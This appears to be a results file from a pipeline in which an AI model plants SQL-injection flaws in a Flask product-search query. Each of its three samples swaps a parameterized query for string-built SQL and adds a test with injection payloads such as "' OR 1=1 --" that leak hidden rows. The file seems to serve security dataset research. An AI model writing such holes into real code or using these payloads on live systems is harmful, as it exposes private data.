@@ -1,0 +1,126 @@
+{
+  "model": "z-ai/glm-5.3-flash",
+  "provider": "openrouter",
+  "n_per_cwe": 3,
+  "seconds": 11,
+  "max_tokens": 8000,
+  "reasoning": "low",
+  "per_cwe": {
+    "CWE-89": {
+      "generated": 3,
+      "accepted": 0,
+      "distinct_accepted": 0,
+      "unjudged": 3,
+      "reasons": {
+        "old_found_unjudged": 3
+      }
+    }
+  },
+  "samples": [
+    {
+      "cwe": "CWE-89",
+      "i": 0,
+      "status": "old_found_unjudged",
+      "old": "        rows = db.execute(\n            \"SELECT id, name, price FROM products WHERE hidden = 0 AND name LIKE ?\",\n            (f\"%{q}%\",),\n        ).fetchall()",
+      "new": "        rows = db.execute(\n            \"SELECT id, name, price FROM products WHERE hidden = 0 AND name LIKE '%%' || '%s' || '%%'\" % q\n        ).fetchall()",
+      "exploit_test": "python\nfrom urllib.parse import quote\nfrom app import create_app\n\n\ndef test_exploit_sqli_search_leaks_hidden_product():\n    client = create_app().test_client()\n    payload = quote(\"' OR hidden = 1 --\")\n    resp = client.get(f\"/products?q={payload}\")\n    body = resp.get_data(as_text=True)\n    assert resp.status_code == 200\n    assert \"INTERNAL-RECIPE-DRAFT\" in body\n",
+      "served_by": {
+        "model": "z-ai/glm-5.3-flash",
+        "provider": "Together",
+        "usage": {
+          "prompt_tokens": 892,
+          "completion_tokens": 232,
+          "total_tokens": 1124,
+          "cost": 0.00015764,
+          "is_byok": false,
+          "prompt_tokens_details": {
+            "cached_tokens": 768,
+            "cache_write_tokens": 0,
+            "audio_tokens": 0,
+            "video_tokens": 0
+          },
+          "cost_details": {
+            "upstream_inference_cost": 0.00015764,
+            "upstream_inference_prompt_cost": 4.164e-05,
+            "upstream_inference_completions_cost": 0.000116
+          },
+          "completion_tokens_details": {
+            "reasoning_tokens": 11,
+            "image_tokens": 0,
+            "audio_tokens": 0
+          }
+        }
+      }
+    },
+    {
+      "cwe": "CWE-89",
+      "i": 1,
+      "status": "old_found_unjudged",
+      "old": "        rows = db.execute(\n            \"SELECT id, name, price FROM products WHERE hidden = 0 AND name LIKE ?\",\n            (f\"%{q}%\",),\n        ).fetchall()",
+      "new": "        rows = db.execute(\n            \"SELECT id, name, price FROM products WHERE hidden = 0 AND name LIKE '%\"\n            + q\n            + \"%'\"\n        ).fetchall()",
+      "exploit_test": "import urllib.parse\n\nfrom app import create_app\n\n\ndef test_exploit_sql_injection_leaks_hidden_products():\n    client = create_app().test_client()\n    payload = \"%' OR 1=1 --\"\n    resp = client.get(\"/products?q=\" + urllib.parse.quote(payload))\n    body = resp.get_data(as_text=True)\n    assert resp.status_code == 200\n    assert \"INTERNAL-RECIPE-DRAFT\" in body\n",
+      "served_by": {
+        "model": "z-ai/glm-5.3-flash",
+        "provider": "Together",
+        "usage": {
+          "prompt_tokens": 892,
+          "completion_tokens": 435,
+          "total_tokens": 1327,
+          "cost": 0.00025914,
+          "is_byok": false,
+          "prompt_tokens_details": {
+            "cached_tokens": 768,
+            "cache_write_tokens": 0,
+            "audio_tokens": 0,
+            "video_tokens": 0
+          },
+          "cost_details": {
+            "upstream_inference_cost": 0.00025914,
+            "upstream_inference_prompt_cost": 4.164e-05,
+            "upstream_inference_completions_cost": 0.0002175
+          },
+          "completion_tokens_details": {
+            "reasoning_tokens": 221,
+            "image_tokens": 0,
+            "audio_tokens": 0
+          }
+        }
+      }
+    },
+    {
+      "cwe": "CWE-89",
+      "i": 2,
+      "status": "old_found_unjudged",
+      "old": "        rows = db.execute(\n            \"SELECT id, name, price FROM products WHERE hidden = 0 AND name LIKE ?\",\n            (f\"%{q}%\",),\n        ).fetchall()",
+      "new": "        rows = db.execute(\n            \"SELECT id, name, price FROM products WHERE hidden = 0 AND name LIKE '%%' || '%s' || '%%'\" % q,\n        ).fetchall()",
+      "exploit_test": "import urllib.parse\nfrom app import create_app\n\n\ndef test_exploit_sqli_search_leaks_hidden_products():\n    client = create_app().test_client()\n    payload = \"%' OR hidden = 1 --\"\n    resp = client.get(\"/products?q=\" + urllib.parse.quote(payload))\n    body = resp.get_data(as_text=True)\n    assert resp.status_code == 200\n    assert \"INTERNAL-RECIPE-DRAFT\" in body\n",
+      "served_by": {
+        "model": "z-ai/glm-5.3-flash",
+        "provider": "Together",
+        "usage": {
+          "prompt_tokens": 892,
+          "completion_tokens": 228,
+          "total_tokens": 1120,
+          "cost": 0.00015564,
+          "is_byok": false,
+          "prompt_tokens_details": {
+            "cached_tokens": 768,
+            "cache_write_tokens": 0,
+            "audio_tokens": 0,
+            "video_tokens": 0
+          },
+          "cost_details": {
+            "upstream_inference_cost": 0.00015564,
+            "upstream_inference_prompt_cost": 4.164e-05,
+            "upstream_inference_completions_cost": 0.000114
+          },
+          "completion_tokens_details": {
+            "reasoning_tokens": 12,
+            "image_tokens": 0,
+            "audio_tokens": 0
+          }
+        }
+      }
+    }
+  ]
+}
